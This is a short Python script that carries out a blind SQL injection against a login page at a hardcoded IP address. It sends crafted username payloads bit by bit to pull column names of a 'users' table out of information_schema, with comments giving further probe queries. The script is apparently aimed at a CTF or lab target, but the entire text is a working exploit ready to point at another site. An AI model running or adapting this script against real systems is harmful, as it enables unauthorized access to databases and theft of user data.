from requests import post 
import binascii
# substring(bin(ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name="users" LIMIT 1,1),1,1))),1,1)
# 7 columns
# ' or (SELECT count(column_name) FROM information_schema.columns WHERE table_name="users" ) = 7-- -
url = "http://34.143.158.202:4111/index.php?page=login"
columns = []

def binToChar(bin):
	return chr(int(bin, 2))
		
NULL = binToChar("00000000")
WTF = binToChar("1111111")

def run():
	for columnOffset in range(1, 1000):
		columnName = ""
		print("============")
		for nameIndex in range(1, 10000):
			charBin = ""
			for binaryIndex in range(1, 8):#1->7
				payload = "' or substring(bin(ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name=\"users\" LIMIT {0},1),{1},1))),{2},1) = 0-- -".format(columnOffset, nameIndex, binaryIndex)
				# print(payload)
				r = post(url, data={
					"username": payload,
					"password": "aaaa",
					"remember": "1"
					})
				if "username or password not match" in r.text:
					charBin = charBin + "1"
				else:
					charBin = charBin + "0"
				print(charBin)
			char = binToChar(charBin)
			charBin = ""
			if char == NULL:
				print("found column: " + columnName)
				columns.append(columnName)
				columnName = ""
				break
			if char == WTF:
				break
			print("found char: " + char)
			columnName = columnName + char

	print("result: \n" + "\n".join(columns))

run()